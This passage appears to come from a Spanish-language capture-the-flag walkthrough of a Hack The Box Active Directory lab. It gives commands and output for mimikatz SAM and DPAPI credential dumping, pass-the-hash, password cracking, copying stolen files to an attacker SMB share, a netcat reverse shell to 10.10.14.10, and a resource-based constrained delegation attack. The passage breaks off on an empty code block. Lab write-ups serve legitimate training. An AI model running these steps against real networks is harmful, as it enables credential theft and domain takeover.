Desde nuestro sistema Linux, crearemos un servicio SMB utilizando smbserver de Impacket, donde compartiremos el archivo compilado de mimikatz.exe, con soporte para SMBv2.

```powershell
PS C:\Users\pc1\Desktop> Enter-PSSession -ComputerName dev.htb.local  
[dev.htb.local]: PS C:\Users\Administrator\Documents> whoami
htb\administrator
[dev.htb.local]: PS C:\Users\Administrator\Documents>
```

```bash
❯ impacket-smbserver kali . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

En la sesión de Administrator en dev.htb.local, procedemos a copiar el archivo mimikatz.exe y lo utilizamos para realizar el volcado de la SAM del equipo, con el fin de visualizar los hashes NTLM.

```powershell
[dev.htb.local]: PS C:\Users\Administrator\Documents> cp \\10.10.14.10\kali\mimikatz.exe .
[dev.htb.local]: PS C:\Users\Administrator\Documents> .\mimikatz.exe 'token::elevate' 'lsadump::sam' exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

544     {0;000003e7} 1 D 35298          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001327d5} 0 D 1314717     HTB\Administrator       S-1-5-21-4266912945-3985045794-2943778634-500  (14g,24p)        Primary  
 * Thread Token  : {0;000003e7} 1 D 1329433     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : DEV
SysKey : e4b2298c95677ce18cd2198b9a36c7df
Local SID : S-1-5-21-4124311166-4116374192-336467615

SAMKey : bb3dbea7ca8bea043c6523bf5d915ae9

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 67bb396c79f56301b7dc5d219cc85d86

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03fc719a49e2ead4264a2690b650d7f0

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.HTB.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a0e06c2d823c4ffc2249abfd6af36dc90733a7c395ee81094261caf3d6c2dbd1
      aes128_hmac       (4096) : 6cf34b183d3555966797dcd55e6128ba
      des_cbc_md5       (4096) : 202667ab89080ebf
    OldCredentials
      aes256_hmac       (4096) : 977755e7a9132c495b90fe59cf5471cd1187b9dab491dac0cb6d02bcc5e30740
      aes128_hmac       (4096) : e56a6fc47b432e347ad3d918056626fd
      des_cbc_md5       (4096) : 074aae9e5df751f1
    OlderCredentials
      aes256_hmac       (4096) : 9d211ec8e9afdb2bd168120abc6a97375b3aa14826b6b512236c16cc361cd290
      aes128_hmac       (4096) : 99caad607311ade6c51edf9bf0afdd08
      des_cbc_md5       (4096) : 547afdf27c165e3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DEV.HTB.LOCALAdministrator
    Credentials
      des_cbc_md5       : 202667ab89080ebf
    OldCredentials
      des_cbc_md5       : 074aae9e5df751f1


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!
[dev.htb.local]: PS C:\Users\Administrator\Documents>
```

Con el hash NT de Administrator, podemos verificar su validez utilizando crackmapexec para una autenticación a nivel local. Este hash es válido tanto para SMB como para WinRM.

```bash
❯ crackmapexec smb dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
SMB         dev.htb.local   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:DEV) (signing:False) (SMBv1:True)  
SMB         dev.htb.local   445    DEV              [+] DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 (Pwn3d!)

❯ crackmapexec winrm dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
SMB         dev.htb.local   5985   DEV              [*] Windows 10.0 Build 17763 (name:DEV) (domain:DEV)
HTTP        dev.htb.local   5985   DEV              [*] http://dev.htb.local:5985/wsman
WINRM       dev.htb.local   5985   DEV              [+] DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 (Pwn3d!)
```

Podemos simplemente conectarnos con `evil-winrm` usando el hash y leer la `flag`

```powershell
❯ evil-winrm -i dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86  
PS C:\Users\Administrator\Documents> whoami
dev\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
HADES{Sp0ol******sO_Brok3n}
```
Se encontró una copia shadow con vssadmin para dev.htb.local. Para facilitar el acceso, se creará un enlace en la ruta de la copia para acceder desde el directorio C:\VSS, que es un nombre más corto.

```powershell
PS C:\Users\Administrator\Documents> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {001689e5-f1a7-40a8-8b5b-8b6371bd07ca}
   Contained 1 shadow copies at creation time: 9/9/2019 3:10:57 AM
      Shadow Copy ID: {046396e4-6312-45b7-96cd-5e5f6fb017ef}
         Original Volume: (C:)\\?\Volume{21385651-0000-0000-0000-602200000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: dev.htb.local
         Service Machine: dev.htb.local
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential  

PS C:\Users\Administrator\Documents> cmd /c mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\  
symbolic link created for C:\VSS <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
PS C:\Users\Administrator\Documents>
```

  Volveremos a utilizar Mimikatz, que subimos anteriormente, para extraer la SAM de la copia. Para ello, proporcionaremos la ruta absoluta del archivo "system" y del archivo "sam".

```powershell
PS C:\Users\Administrator\Documents> .\mimikatz.exe 'lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM' exit  

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM
Domain : DEV
SysKey : e4b2298c95677ce18cd2198b9a36c7df
Local SID : S-1-5-21-4124311166-4116374192-336467615

SAMKey : bb3dbea7ca8bea043c6523bf5d915ae9

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: de53e322ea95ac2723a2e3e149874aac

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d9557883adf1e351ab19e287ce268464

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.HTB.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 977755e7a9132c495b90fe59cf5471cd1187b9dab491dac0cb6d02bcc5e30740
      aes128_hmac       (4096) : e56a6fc47b432e347ad3d918056626fd
      des_cbc_md5       (4096) : 074aae9e5df751f1
    OldCredentials
      aes256_hmac       (4096) : 9d211ec8e9afdb2bd168120abc6a97375b3aa14826b6b512236c16cc361cd290
      aes128_hmac       (4096) : 99caad607311ade6c51edf9bf0afdd08
      des_cbc_md5       (4096) : 547afdf27c165e3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DEV.HTB.LOCALAdministrator
    Credentials
      des_cbc_md5       : 074aae9e5df751f1
    OldCredentials
      des_cbc_md5       : 547afdf27c165e3b


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!

PS C:\Users\Administrator\Documents>
```

Se observa que el hash NT del usuario "Administrator" es diferente al anterior. Utilizando John the Ripper y aplicando fuerza bruta, logramos obtener la contraseña en texto plano.

```bash
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT  
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
Press 'q' or Ctrl-C to abort, almost any other key for status
./*40ra26AZ      (?)
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Al listar las credenciales en el directorio del Administrador, encontramos dos. Para descifrar las credenciales DPAPI, necesitaremos descargar las master keys que se encuentran en "Protect" dentro de la carpeta que lleva el nombre del SID.

```powershell
PS C:\Users\Administrator\Documents> dir C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials -force  

    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-         9/9/2019   3:08 AM            474 1A2572C793495F694F64823A392D4718
-a-hs-         9/9/2019   3:07 AM            474 4A2EEB30EFC7958491B6578D9948EC7F

S C:\Users\Administrator\Documents> dir C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect  

    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-         9/8/2019  12:44 PM                S-1-5-21-4124311166-4116374192-336467615-500

PS C:\Users\Administrator\Documents> dir C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500 -force  

    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-         9/9/2019   3:07 AM            468 87790867-a883-4a2d-a467-019c315e1104
-a-hs-         9/8/2019  12:44 PM            468 dc6059f1-5ba2-4186-871a-0ff4055a6875
-a-hs-         9/9/2019   3:07 AM             24 Preferred
```

Vamos a iniciar nuevamente un servicio SMB para recibir todos esos archivos de la máquina.

```bash
❯ impacket-smbserver kali . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora vamos a copiar las credenciales DPAPI y las master keys al recurso SMB que hemos creado. Una vez descargados los archivos, para poder descifrarlos, primero copiaremos las credenciales y las master keys a una máquina con Windows para luego ejecutar Mimikatz.

Iniciaremos ingresando la master key, indicando el SID que hemos visto anteriormente y también la contraseña de Administrator que hemos conseguido y decodificado con John.

```powershell
PS C:\Users\Administrator\Documents> cp C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\1A2572C793495F694F64823A392D4718 \\10.10.14.10\kali\1A2572C793495F694F64823A392D4718
PS C:\Users\Administrator\Documents> cp C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\4A2EEB30EFC7958491B6578D9948EC7F \\10.10.14.10\kali\4A2EEB30EFC7958491B6578D9948EC7F
PS C:\Users\Administrator\Documents> cp C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104 \\10.10.14.10\kali\87790867-a883-4a2d-a467-019c315e1104  
PS C:\Users\Administrator\Documents> cp C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\dc6059f1-5ba2-4186-871a-0ff4055a6875 \\10.10.14.10\kali\dc6059f1-5ba2-4186-871a-0ff4
PS C:\Users\Administrator\Documents>
```

```bash
mimikatz # dpapi::masterkey /in:87790867-a883-4a2d-a467-019c315e1104 /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:./*40ra26AZ
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {87790867-a883-4a2d-a467-019c315e1104}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c41ab656df74c2a51cb872fa5a5be7fc
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : bac9efb95aeb3796cabdb684ec758f5d32b0a9c564eb6f32b9a8de9c75d8ac677b6ce2b6da49875e2c04629a23260e7ac849955cc17aed002e3d1a0154ce86cb8faec38312fa7d65472dcdba7e4e79688558f3a185c4f5fbb8e09a24f3b9d48dbbe802eef159ca62a394354b15beb940eadeb014f82a09cb2e92eed7276facbb50c01177f5db0b76ed3f31fb877e3ec5  


[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 50cbeb0513a21c53150e9b0cad9bd772
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 8b123f98402a3bc524367f6b00f918ccf767054a961fb96de8be049705d016c86db0323c769623a64140e782c8e85dd101530208d3d169a85b35fd65276689042bbf4ed4e3984171799d97a99ff2bf53f4603593a058f39da49d537041204e58f0dc808efc132085c9f703ae3c6a7aab

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {26b08a5f-4b2c-420d-9843-d05ea57cd32f}



[masterkey] with password: ./*40ra26AZ (normal user)
  key : e0b92cbfbeab126231d979377ffd236b2ebd4b0704e2e9229d3ce82bebd144173b9f7160315d5af62289fae50a1fd465100aaf36748b68557e2b05edc25ac4fe
  sha1: dacd0e1ccaa03abd1ccb22ce058815624739a607

mimikatz #
```

Al realizar este proceso, Mimikatz guardará la master key y la credencial DPAPI en caché.

```bash
mimikatz # dpapi::cache

CREDENTIALS cache
=================
SID:S-1-5-21-4124311166-4116374192-336467615-500;GUID:{26b08a5f-4b2c-420d-9843-d05ea57cd32f};MD4:de53e322ea95ac2723a2e3e149874aac;SHA1:7cb14ea6f0ed4e5ed9ac0a6a167f088eeec2e09b;  

MASTERKEYS cache
================
GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607

DOMAINKEYS cache
================

mimikatz #
```

Después simplemente podemos pasarle la primera de ambas credenciales DPAPI a Mimikatz para descifrarlas. Esta tiene como destino la flag y como contenido su valor.

```bash
mimikatz # dpapi::cred /in:1A2572C793495F694F64823A392D4718
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {87790867-a883-4a2d-a467-019c315e1104}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 70fb047908ba7943f6933f49a289e407b87d8432e85bbe45ad9b91cee513bc9c
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 9e73cba5176f1ba8bbd5a999eb9092e9371dfba4195d55d5e30b030e671206cb
  dwDataLen          : 000000c0 - 192
  pbData             : b55d72a3e4f00c4b103e5a23e6cb4bc97594204460d87cb7555dc700cd8c304050f0bac19475c4e9b0935d8808d7e6ef67d37d11ac43c6018bc59a8de680548c5e6f5f5344b4a9f9f0ea6fc3d6d847a72fbb97a54845c627e37b7aa368b4d6d24831af7cc2bcec6ac7d376651adb734bf93091eb034722cdd99974da553fa741eb5124394189e6018ad07543f796102adc5e3f81b28082350cab75ca407025a449eafc18c5795fe15e497df6a330ed64ca37f94df1b32dfb592f0562d1fabcce
  dwSignLen          : 00000040 - 64
  pbSign             : a0a7a1f7462b93455e6673f33d45742931269a9eb9666515a04852bdfcb78ad570352e10c78805356f8baf0751f33dcfb70b29a9c49eb10ec14121e815381196

Decrypting Credential:
 * volatile cache: GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000b6 - 182
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 09/09/2019 10:08:32 a. m.
  unkFlagsOrSize : 00000040 - 64
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=flag
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : flag
  CredentialBlob : HADES{V5C_r3ve4L_DPaP1_s3cret5}
  Attributes     : 0

mimikatz #
```

La otra credencial DPAPI nos muestra como nombre de usuario el usuario "test-svc" a nivel de dominio, y como contenido de la credencial encontramos su contraseña.

```bash
mimikatz # dpapi::cred /in:4A2EEB30EFC7958491B6578D9948EC7F
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {87790867-a883-4a2d-a467-019c315e1104}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : fdb8e305b9dee0d4731a4e95af29273c2da220f0f7a5d41d83bfd14dff9f8cc5
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : c79494440e85f96dba9a8244ddef0a399ba44453dcfda0ae2a0e69349c0b0a0f
  dwDataLen          : 000000c0 - 192
  pbData             : b207f818a6599b2f7b4cbd9635bfa1658489e4ff501cd14d89187bea2e1ebafb01ce45bbc23100e8d3316c8ba0f02370ac09985027298520434cc9f607c52ce92bae597b54451f7f79b24b9c3184794927cbbccf0babde469ae281481a7e96b19c3131de62a77cb0f95604b02668aa9c54f04714c79843874f9a98131b8f22bfde94cfd011b1f3a56c1bab6e09ee0aa4e452d5b1c751d91659c11a0544cb6923bd9d891b07c432d844810a55a2dc3aa87db3452d2ad679c76532db453937c226  
  dwSignLen          : 00000040 - 64
  pbSign             : e59eba5fedeb1dab7d34f4e8392471dfed422e845bee3d5b83994d8c8fd4ce1b84b58550ca7514f28d5115a64bf6c5c830cbb40a5e213a519f829893186edbc0

Decrypting Credential:
 * volatile cache: GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000ba - 186
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 09/09/2019 10:07:12 a. m.
  unkFlagsOrSize : 00000028 - 40
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=web
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : htb.local\test-svc
  CredentialBlob : T3st-S3v!ce-F0r-Pr0d
  Attributes     : 0

mimikatz #
```

Confirmamos que las credenciales a nivel de dominio son válidas utilizando CrackMapExec. Para enumerar privilegios e información del dominio, comenzaremos por subir el módulo SharpHound.ps1 utilizando la función "upload" que viene incluida en Evil-WinRM.

```bash
❯ crackmapexec smb dc1.htb.local -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d'
SMB         dc1.htb.local   445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
SMB         dc1.htb.local   445    DC1              [+] htb.local\test-svc:T3st-S3v!ce-F0r-Pr0d
```

```powershell
PS C:\Users\Administrator\Documents> upload SharpHound.ps1

Info: Uploading SharpHound.ps1 to C:\Users\Administrator\Documents\SharpHound.ps1  

Data: 1757460 bytes of 1757460 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents>
```

Dado que las credenciales también son válidas para LDAP, importamos el módulo SharpHound y lo invocamos, pasándole las credenciales de test-svc.

```bash
❯ crackmapexec ldap dc1.htb.local -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d'
SMB         dc1.htb.local   445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
LDAP        dc1.htb.local   389    DC1              [+] htb.local\test-svc:T3st-S3v!ce-F0r-Pr0d
```

```powershell
PS C:\Users\Administrator\Documents> Import-Module .\SharpHound.ps1
PS C:\Users\Administrator\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LdapUser 'test-svc' -LdapPassword 'T3st-S3v!ce-F0r-Pr0d'  
PS C:\Users\Administrator\Documents>
```

Al ejecutarlo, se creará un archivo ZIP con toda la información del dominio. Podemos simplemente descargarlo utilizando la función "download" de Evil-WinRM como BH.zip. Luego, lo subimos a BloodHound. Mirando los controles de objetos del usuario test-svc, encontramos que tiene el privilegio GenericAll sobre el equipo web.htb.local.

```powershell
PS C:\Users\Administrator\Documents> dir

    Directory: C:\Users\Administrator\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2023   9:06 PM          12157 20230427210646_BloodHound.zip
-a----        4/27/2023   8:46 PM        1250056 mimikatz.exe
-a----        4/27/2023   9:03 PM        1318097 SharpHound.ps1

PS C:\Users\Administrator\Documents> download .\20230427210646_BloodHound.zip BH.zip  

Info: Downloading .\20230427210646_BloodHound.zip to BH.zip

Info: Download successful!

PS C:\Users\Administrator\Documents>
```

![AD](/assets/images/AD2.png)

Para explotarlo, necesitaremos algunos elementos. Comenzaremos por los módulos PowerView y Powermad, además de Rubeus para solicitar e importar un ticket al final.

```powershell
PS C:\Users\Administrator\Documents> upload PowerView.ps1

Info: Uploading PowerView.ps1 to C:\Users\Administrator\Documents\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> upload Powermad.ps1

Info: Uploading Powermad.ps1 to C:\Users\Administrator\Documents\Powermad.ps1  

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> upload Rubeus.exe

Info: Uploading Rubeus.exe to C:\Users\Administrator\Documents\Rubeus.exe

Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents>
```

Entiendo. Dado que la operación que necesitamos realizar requiere ejecutarse como el usuario NT AUTHORITY\SYSTEM, subiremos un par de módulos y el archivo netcat.exe.

```powershell
PS C:\Users\Administrator\Documents> upload Invoke-CommandAs.ps1

Info: Uploading Invoke-CommandAs.ps1 to C:\Users\Administrator\Documents\Invoke-CommandAs.ps1

Data: 25480 bytes of 25480 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> upload Invoke-ScheduledTask.ps1

Info: Uploading Invoke-ScheduledTask.ps1 to C:\Users\Administrator\Documents\Invoke-ScheduledTask.ps1  

Data: 13788 bytes of 13788 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> upload netcat.exe

Info: Uploading netcat.exe to C:\Users\Administrator\Documents\netcat.exe

Data: 60360 bytes of 60360 bytes copied

Info: Upload successful!
```

Para lograr eso, importaremos ambos módulos y utilizaremos netcat para enviarnos una sesión de PowerShell a nuestro host, pero ejecutándola como el usuario NT AUTHORITY\SYSTEM utilizando el parámetro 'AsSystem'.

```powershell
PS C:\Users\Administrator\Documents> Import-Module .\Invoke-CommandAs.ps1
PS C:\Users\Administrator\Documents> Import-Module .\Invoke-ScheduledTask.ps1
PS C:\Users\Administrator\Documents> Invoke-CommandAs -ScriptBlock { C:\Users\Administrator\Documents\netcat.exe -e powershell.exe 10.10.14.10 443 } -AsSystem  
PS C:\Users\Administrator\Documents>
```

```powershell
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.17
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>
```

Una vez que hemos asegurado esta shell, importamos ambos módulos que subimos anteriormente. Luego, definimos las credenciales del usuario test-svc que tiene los privilegios necesarios. A continuación, agregamos una nueva cuenta de equipo, en este caso identificada con el nombre "attackersystem", y le asignamos una contraseña sencilla de recordar, como "123456".

```powershell
PS C:\Users\Administrator\Documents> Import-Module .\Powermad.ps1
PS C:\Users\Administrator\Documents> Import-Module .\PowerView.ps1  
PS C:\Users\Administrator\Documents> $SecPassword = ConvertTo-SecureString 'T3st-S3v!ce-F0r-Pr0d' -AsPlainText -Force
PS C:\Users\Administrator\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\test-svc', $SecPassword)  
PS C:\Users\Administrator\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Credential $Cred  
[+] Machine account attackersystem added
PS C:\Users\Administrator\Documents>
```

Siguiendo los pasos indicados por BloodHound en la sección de ayuda de GenericAll, obtenemos la variable $SDBytes del equipo "attackersystem" que hemos creado. Finalmente, establecemos el objeto hacia el equipo WEB donde tenemos los privilegios.

```powershell
PS C:\Users\Administrator\Documents> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid -Credential $Cred | Select -Expand objectsid
PS C:\Users\Administrator\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"  
PS C:\Users\Administrator\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Users\Administrator\Documents> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Users\Administrator\Documents> Get-DomainComputer WEB -Credential $Cred | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Credential $Cred  
PS C:\Users\Administrator\Documents>
```

Este proceso también se puede realizar desde Linux utilizando herramientas como Impacket. Podemos crear el equipo con `addcomputer` de Impacket y configurar los permisos hacia WEB utilizando `rbcd` (Resource-Based Constrained Delegation).

```bash
❯ impacket-addcomputer -computer-name attackersystem$ -computer-pass 123456 htb.local/test-svc:'T3st-S3v!ce-F0r-Pr0d'  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account attackersystem$ with password 123456.

❯ impacket-rbcd -delegate-from attackersystem$ -delegate-to WEB$ -action write htb.local/test-svc:'T3st-S3v!ce-F0r-Pr0d'  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] attackersystem$ can now impersonate users on WEB$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     attackersystem$   (S-1-5-21-4266912945-3985045794-2943778634-15101)
```

con Rubeus.exe podemos convertir la contraseña "123456" que hemos establecido a un hash.

```powershell
PS C:\Users\Administrator\Documents> .\Rubeus.exe hash /password:123456 /user:attackersystem$ /domain:htb.local  

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : attackersystem$
[*] Input domain               : htb.local
[*] Salt                       : HTB.LOCALhostattacketsystem.htb.local
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : BB8C605808D76972251505B80FE6FDC2
[*]       aes256_cts_hmac_sha1 : 25AE34697F20A4A40AA2568B2E000B9FEAF46DE374C432D4A34D36F1EBC50392
[*]       des_cbc_md5          : 13E576A2D051854A

PS C:\Users\Administrator\Documents>
```

Si al intentar obtener un ticket suplantando a Administrator utilizando el hash de la contraseña "123456" para el equipo attackersystem$ en el dominio htb.local, se produce un error, puede deberse a varios motivos: permisos insuficientes para suplantar al usuario, configuración incorrecta en Rubeus o en la solicitud del ticket, restricciones de seguridad en el dominio que impiden la suplantación, o posibles errores de sintaxis en el comando utilizado. Sería útil revisar el error específico para diagnosticar y solucionar el problema.

```powershell
